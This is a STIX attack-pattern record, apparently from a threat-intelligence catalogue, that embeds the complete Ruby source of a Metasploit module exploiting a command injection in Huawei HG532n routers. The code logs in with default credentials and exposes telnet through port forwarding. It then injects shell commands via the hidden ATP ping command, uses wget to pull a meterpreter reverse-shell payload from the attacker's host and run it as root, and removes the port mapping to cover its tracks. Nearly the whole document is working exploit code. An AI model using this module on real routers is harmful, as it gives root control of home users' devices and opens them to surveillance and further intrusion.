{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3b7f1e29-13f7-4814-a944-4bd9dbadacb4",
    "created": "2024-08-14T17:02:29.570173Z",
    "modified": "2024-08-14T17:02:29.570177Z",
    "name": "Huawei HG532n Command Injection",
    "description": "( This module exploits a command injection vulnerability in the Huawei HG532n routers provided by TE-Data Egypt, leading to a root shell.  The router's web interface has two kinds of logins, a \"limited\" user:user login given to all customers and an admin mode. The limited mode is used here to expose the router's telnet port to the outside world through NAT port-forwarding.  With telnet now remotely accessible, the router's limited \"ATP command line tool\" (served over telnet) can be upgraded to a root shell through an injection into the ATP's hidden \"ping\" command. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/huawei_hg532n_cmdinject.rb",
            "external_id": "huawei_hg532n_cmdinject.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/8245"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'base64'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'        => 'Huawei HG532n Command Injection',\n      'Description' => %q(\n        This module exploits a command injection vulnerability in the Huawei\n        HG532n routers provided by TE-Data Egypt, leading to a root shell.\n\n        The router's web interface has two kinds of logins, a \"limited\" user:user\n        login given to all customers and an admin mode. The limited mode is used\n        here to expose the router's telnet port to the outside world through NAT\n        port-forwarding.\n\n        With telnet now remotely accessible, the router's limited \"ATP command\n        line tool\" (served over telnet) can be upgraded to a root shell through\n        an injection into the ATP's hidden \"ping\" command.\n      ),\n      'Author'         =>\n        [\n          'Ahmed S. Darwish <darwish.07@gmail.com>',    # Vulnerability discovery, msf module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_MIPSBE,\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp'\n        },\n      'Targets'        =>\n        [\n          [\n            'Linux mipsbe Payload',\n            {\n              'Arch'     => ARCH_MIPSBE,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-04-15',\n      'References' => [\n        ['URL', 'https://github.com/rapid7/metasploit-framework/pull/8245']\n      ]\n    ))\n    register_options(\n      [\n        OptString.new('HttpUsername', [false, 'Valid web-interface user-mode username', 'user']),\n        OptString.new('HttpPassword', [false, 'Web-interface username password', 'user']),\n        OptString.new('TelnetUsername', [false, 'Valid router telnet username', 'admin']),\n        OptString.new('TelnetPassword', [false, 'Telnet username password', 'admin']),\n        OptAddress.new('DOWNHOST', [false, 'Alternative host to request the MIPS payload from']),\n        OptString.new('DOWNFILE', [false, 'Filename to download, (default: random)']),\n        OptInt.new(\"ListenerTimeout\", [true, \"Number of seconds to wait for the exploit to connect back\", 60])\n      ], self.class\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def default_credential?\n    true\n  end\n\n  def check\n    httpd_fingerprint = %r{\n      \\A\n      HTTP\\/1\\.1\\s200\\sOK\\r\\n\n      CACHE-CONTROL:\\sno-cache\\r\\n\n      Date:\\s.*\\r\\n\n      Connection:\\sKeep-Alive\\r\\n\n      Content-Type:\\stext\\/html\\r\\n\n      Content-Length:\\s\\d+\\r\\n\n      \\r\\n\n      <html>\\n<head>\\n\n      <META\\shttp-equiv=\"Content-Type\"\\scontent=\"text\\/html;\\scharset=UTF-8\">\\r\\n\n      <META\\shttp-equiv=\"Pragma\"\\scontent=\"no-cache\">\\n\n      <META\\shttp-equiv=\"expires\"\\sCONTENT=\"-1\">\\n\n      <link\\srel=\"icon\"\\stype=\"image\\/icon\"\\shref=\"\\/favicon.ico\"\\/>\n    }x\n\n    begin\n      res = send_request_raw(\n        'method' => 'GET',\n        'uri'    => '/'\n      )\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - Could not connect to device\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res && res.code == 200 && res.to_s =~ httpd_fingerprint\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  #\n  # The Javascript code sends all passwords in the form:\n  #      form.setAction('/index/login.cgi');\n  #      form.addParameter('Username', Username.value);\n  #      form.addParameter('Password', base64encode(SHA256(Password.value)));\n  # Do the same base64 encoding and SHA-256 hashing here.\n  #\n  def hash_password(password)\n    sha256 = OpenSSL::Digest::SHA256.hexdigest(password)\n    Base64.encode64(sha256).gsub(/\\s+/, \"\")\n  end\n\n  #\n  # Without below cookies, which are also sent by the JS code, the\n  # server will consider even correct HTTP requests invalid\n  #\n  def generate_web_cookie(admin: false, session: nil)\n    if admin\n      cookie =  'FirstMenu=Admin_0; '\n      cookie << 'SecondMenu=Admin_0_0; '\n      cookie << 'ThirdMenu=Admin_0_0_0; '\n    else\n      cookie =  'FirstMenu=User_2; '\n      cookie << 'SecondMenu=User_2_1; '\n      cookie << 'ThirdMenu=User_2_1_0; '\n    end\n\n    cookie << 'Language=en'\n    cookie << \"; #{session}\" unless session.nil?\n    cookie\n  end\n\n  #\n  # Login to the router through its JS-based login page. Upon a successful\n  # login, return the keep-alive HTTP session cookie\n  #\n  def web_login\n    cookie = generate_web_cookie(admin: true)\n\n    # On good passwords, the router redirect us to the /html/content.asp\n    # homepage. Otherwise, it throws us back to the '/' login page. Thus\n    # consider the ASP page our valid login marker\n    invalid_login_marker = \"var pageName = '/'\"\n    valid_login_marker = \"var pageName = '/html/content.asp'\"\n\n    username = datastore['HttpUsername']\n    password = datastore['HttpPassword']\n\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => '/index/login.cgi',\n      'cookie'    => cookie,\n      'vars_post' => {\n        'Username' => username,\n        'Password' => hash_password(password)\n      }\n    )\n    fail_with(Failure::Unreachable, \"Connection timed out\") if res.nil?\n\n    unless res.code == 200\n      fail_with(Failure::NotFound, \"Router returned unexpected HTTP code #{res.code}\")\n    end\n\n    return res.get_cookies if res.body.include? valid_login_marker\n\n    if res.body.include? invalid_login_marker\n      fail_with(Failure::NoAccess, \"Invalid web interface credentials #{username}:#{password}\")\n    else\n      fail_with(Failure::UnexpectedReply, \"Neither valid or invalid login markers received\")\n    end\n  end\n\n  #\n  # The telnet port is filtered by default. Expose it to the outside world\n  # through NAT forwarding\n  #\n  def expose_telnet_port(session_cookies)\n    cookie = generate_web_cookie(session: session_cookies)\n\n    external_telnet_port = rand(32767) + 32768\n\n    portmapping_page = '/html/application/portmapping.asp'\n    valid_port_export_marker = \"var pageName = '#{portmapping_page}';\"\n    invalid_port_export_marker = /var ErrInfo = \\d+/\n\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => '/html/application/addcfg.cgi',\n      'cookie'    => cookie,\n      'headers'   => { 'Referer' => \"http://#{rhost}#{portmapping_page}\" },\n      'vars_get'  => {\n        'x'           => 'InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.PortMapping',\n        'RequestFile' => portmapping_page\n      },\n      'vars_post' => {\n        'x.PortMappingProtocol'    => \"TCP\",\n        'x.PortMappingEnabled'     => \"1\",\n        'x.RemoteHost'             => \"\",\n        'x.ExternalPort'           => external_telnet_port.to_s,\n        'x.ExternalPortEndRange'   => external_telnet_port.to_s,\n        'x.InternalClient'         => \"192.168.1.1\",\n        'x.InternalPort'           => \"23\",\n        'x.PortMappingDescription' => Rex::Text.rand_text_alpha(10) # Minimize any possible conflict\n      }\n    )\n    fail_with(Failure::Unreachable, \"Connection timed out\") if res.nil?\n\n    unless res.code == 200\n      fail_with(Failure::NotFound, \"Router returned unexpected HTTP code #{res.code}\")\n    end\n\n    if res.body.include? valid_port_export_marker\n      print_good \"Telnet port forwarding succeeded; exposed telnet port = #{external_telnet_port}\"\n      return external_telnet_port\n    end\n\n    if res.body.match? invalid_port_export_marker\n      fail_with(Failure::Unknown, \"Router reported port-mapping error. \" \\\n                \"A port-forwarding entry with same external port (#{external_telnet_port}) already exist?\")\n    end\n\n    fail_with(Failure::UnexpectedReply, \"Port-forwarding failed: neither valid or invalid markers received\")\n  end\n\n  #\n  # Cover our tracks; don't leave the exposed router's telnet port open\n  #\n  def hide_exposed_telnet_port(session_cookies)\n    cookie = generate_web_cookie(session: session_cookies)\n    portmapping_page = '/html/application/portmapping.asp'\n\n    # Gather a list of all existing ports forwarded so we can purge them soon\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => portmapping_page,\n      'cookie'    => cookie\n    )\n\n    unless res && res.code == 200\n      print_warning \"Could not get current forwarded ports from web interface\"\n    end\n\n    # Collect existing port-forwarding keys; to be passed to the delete POST request\n    portforward_key = /InternetGatewayDevice\\.WANDevice\\.1\\.WANConnectionDevice\\.1\\.WANPPPConnection\\.1\\.PortMapping\\.\\d+/\n    vars_post = {}\n    res.body.scan(portforward_key).uniq.each do |key|\n      vars_post[key] = \"\"\n    end\n\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => '/html/application/del.cgi',\n      'cookie'    => cookie,\n      'headers'   => { 'Referer' => \"http://#{rhost}#{portmapping_page}\" },\n      'vars_get'  => { 'RequestFile' => portmapping_page },\n      'vars_post' => vars_post\n    )\n    return if res && res.code == 200\n\n    print_warning \"Could not re-hide exposed telnet port\"\n  end\n\n  #\n  # Cleanup our state, after any successful web login. Note: router refuses\n  # more than 3 concurrent logins from the same IP. It also forces a 1-minute\n  # delay after 3 unsuccessful logins from _any_ IP.\n  #\n  def web_logout(session_cookies)\n    cookie = generate_web_cookie(admin: true, session: session_cookies)\n\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => '/index/logout.cgi',\n      'cookie'    => cookie,\n      'headers'   => { 'Referer' => \"http://#{rhost}/html/main/logo.html\" }\n    )\n    return if res && res.code == 200\n\n    print_warning \"Could not logout from web interface. Future web logins may fail!\"\n  end\n\n  #\n  # Don't leave web sessions idle for too long (> 1 second). It triggers the\n  # HTTP server's safety mechanisms and make it refuse further operations.\n  #\n  # Thus do all desired web operations in chunks: log in, do our stuff (passed\n  # block), and immediately log out. The router's own javescript code handles\n  # this by sending a refresh request every second.\n  #\n  def web_operation\n    begin\n      cookie = web_login\n      yield cookie\n    ensure\n      web_logout(cookie) unless cookie.nil?\n    end\n  end\n\n  #\n  # Helper method. Used for waiting on telnet banners and prompts.\n  # Always catch the ::Timeout::Error exception upon calling this.\n  #\n  def read_until(sock, timeout, marker)\n    received = ''\n    Timeout.timeout(timeout) do\n      loop do\n        r = (sock.get_once(-1, 1) || '')\n        next if r.empty?\n\n        received << r\n        print_status \"Received new reply token = '#{r.strip}'\" if datastore['VERBOSE'] == true\n        return received if received.include? marker\n      end\n    end\n  end\n\n  #\n  # Borrowing constants from Ruby's Net::Telnet class (ruby license)\n  #\n  IAC         =  255.chr   # \"\\377\" # \"\\xff\" # interpret as command\n  DO          =  253.chr   # \"\\375\" # \"\\xfd\" # please, you use option\n  OPT_BINARY  =  0.chr     # \"\\000\" # \"\\x00\" # Binary Transmission\n  OPT_ECHO    =  1.chr     # \"\\001\" # \"\\x01\" # Echo\n  OPT_SGA     =  3.chr     # \"\\003\" # \"\\x03\" # Suppress Go Ahead\n  OPT_NAOFFD  =  13.chr    # \"\\r\"   # \"\\x0d\" # Output Formfeed Disposition\n\n  def telnet_auth_negotiation(sock, timeout)\n    begin\n      read_until(sock, timeout, 'Password:')\n      sock.write(IAC + DO + OPT_ECHO + IAC + DO + OPT_SGA)\n    rescue ::Timeout::Error\n      fail_with(Failure::UnexpectedReply, \"Expected first password banner not received\")\n    end\n\n    begin\n      read_until(sock, timeout, 'Password:') # Router bug\n      sock.write(datastore['TelnetPassword'] + OPT_NAOFFD + OPT_BINARY)\n    rescue ::Timeout::Error\n      fail_with(Failure::UnexpectedReply, \"Expected second password banner not received\")\n    end\n  end\n\n  def telnet_prompt_wait(error_regex = nil)\n    begin\n      result = read_until(@telnet_sock, @telnet_timeout, @telnet_prompt)\n      if error_regex\n        error_regex = [error_regex] unless error_regex.is_a? Array\n        error_regex.each do |regex|\n          if result.match? regex\n            fail_with(Failure::UnexpectedReply, \"Error expression #{regex} included in reply\")\n          end\n        end\n      end\n    rescue ::Timeout::Error\n      fail_with(Failure::UnexpectedReply, \"Expected telnet prompt '#{@telnet_prompt}' not received\")\n    end\n  end\n\n  #\n  # Basic telnet login. Due to mixins conflict, revert to using plain\n  # Rex sockets (thanks @hdm!)\n  #\n  def telnet_login(port)\n    print_status \"Connecting to just-exposed telnet port #{port}\"\n\n    @telnet_prompt = 'HG520b>'\n    @telnet_timeout = 60\n\n    @telnet_sock = Rex::Socket.create_tcp(\n      'PeerHost' => rhost,\n      'PeerPort' => port,\n      'Context'  => { 'Msf' => framework, 'MsfExploit' => self },\n      'Timeout'  => @telnet_timeout\n    )\n    if @telnet_sock.nil?\n      fail_with(Failure::Unreachable, \"Exposed telnet port unreachable\")\n    end\n    add_socket(@telnet_sock)\n\n    print_good \"Connection succeeded. Passing telnet credentials\"\n    telnet_auth_negotiation(@telnet_sock, @telnet_timeout)\n\n    print_good \"Credentials passed; waiting for prompt '#{@telnet_prompt}'\"\n    telnet_prompt_wait\n\n    print_good 'Prompt received. Telnet access fully granted!'\n  end\n\n  def telnet_exit\n    return if @telnet_sock.nil?\n    @telnet_sock.write('exit' + OPT_NAOFFD + OPT_BINARY)\n  end\n\n  #\n  # Router's limited ATP shell just reverts to classical Linux\n  # shell when executing a ping:\n  #\n  #       \"ping %s > /var/res_ping\"\n  #\n  # A successful injection would thus substitute all its spaces to\n  # ${IFS}, and trails itself with \";true\" so it can have its own\n  # IO redirection.\n  #\n  def execute_command(command, error_regex = nil, background: false)\n    print_status \"Running command on target: #{command}\"\n\n    command.gsub!(/\\s/, '${IFS}')\n    separator = background ? '&' : ';'\n    atp_cmd = \"ping ?;#{command}#{separator}true\"\n\n    @telnet_sock.write(atp_cmd + OPT_NAOFFD + OPT_BINARY)\n    telnet_prompt_wait(error_regex)\n    print_good \"Command executed successfully\"\n  end\n\n  #\n  # Our own HTTP server, for serving the payload\n  #\n  def start_http_server\n    @pl = generate_payload_exe\n\n    downfile = datastore['DOWNFILE'] || rand_text_alpha(8 + rand(8))\n    resource_uri = '/' + downfile\n\n    if datastore['DOWNHOST']\n      print_status \"Will not start local web server, as DOWNHOST is already defined\"\n    else\n      print_status(\"Starting web server; hosting #{resource_uri}\")\n      start_service(\n        'ServerHost' => '0.0.0.0',\n        'Uri' => {\n          'Proc' => proc { |cli, req| on_request_uri(cli, req) },\n          'Path' => resource_uri\n        }\n      )\n    end\n\n    resource_uri\n  end\n\n  #\n  # HTTP server incoming request callback\n  #\n  def on_request_uri(cli, _request)\n    print_good \"HTTP server received request. Sending payload to victim\"\n    send_response(cli, @pl)\n  end\n\n  #\n  # Unfortunately we could not use the `echo' command stager since\n  # the router's busybox echo does not understand the necessary\n  # \"-en\" options. It outputs them to the binary instead.\n  #\n  # We could not also use the `wget' command stager, as Huawei\n  # crafted their own implementation with much different params.\n  #\n  def download_and_run_payload(payload_uri)\n    srv_host =\n      if datastore['DOWNHOST']\n        datastore['DOWNHOST']\n      elsif datastore['SRVHOST'] == \"0.0.0.0\" || datastore['SRVHOST'] == \"::\"\n        Rex::Socket.source_address(rhost)\n      else\n        datastore['SRVHOST']\n      end\n\n    srv_port = datastore['SRVPORT'].to_s\n    output_file = \"/tmp/#{rand_text_alpha_lower(8)}\"\n\n    # Check module documentation for the special wget syntax\n    wget_cmd = \"wget -g -v -l #{output_file} -r #{payload_uri} -P#{srv_port} #{srv_host}\"\n\n    execute_command(wget_cmd, [/cannot connect/, /\\d+ error/]) # `404 error', etc.\n    execute_command(\"chmod 700 #{output_file}\", /No such file/)\n    execute_command(output_file, /not found/, background: true)\n    execute_command(\"rm #{output_file}\", /No such file/)\n  end\n\n  #\n  # At the end of the module, especially for reverse_tcp payloads, wait for\n  # the payload to connect back to us.  There's a very high probability we\n  # will lose the payload's signal otherwise.\n  #\n  def wait_for_payload_session\n    print_status \"Waiting for the payload to connect back ..\"\n    begin\n      Timeout.timeout(datastore['ListenerTimeout']) do\n        loop do\n          break if session_created?\n          Rex.sleep(0.25)\n        end\n      end\n    rescue ::Timeout::Error\n      fail_with(Failure::Unknown, \"Timeout waiting for payload to start/connect-back\")\n    end\n    print_good \"Payload connected!\"\n  end\n\n  #\n  # Main exploit code: login through web interface; port-forward router's\n  # telnet; access telnet and gain root shell through command injection.\n  #\n  def exploit\n    print_status \"Validating router's HTTP server (#{rhost}:#{rport}) signature\"\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::Unknown, \"Unable to validate device fingerprint. Is it an HG532n?\")\n    end\n\n    print_good \"Good. Router seems to be a vulnerable HG532n device\"\n\n    telnet_port = nil\n    web_operation do |cookie|\n      telnet_port = expose_telnet_port(cookie)\n    end\n\n    begin\n      telnet_login(telnet_port)\n      payload_uri = start_http_server\n      download_and_run_payload(payload_uri)\n      wait_for_payload_session\n    ensure\n      telnet_exit\n      web_operation do |cookie|\n        hide_exposed_telnet_port(cookie)\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-15",
    "x_mitre_platforms": [
        "linux"
    ]
}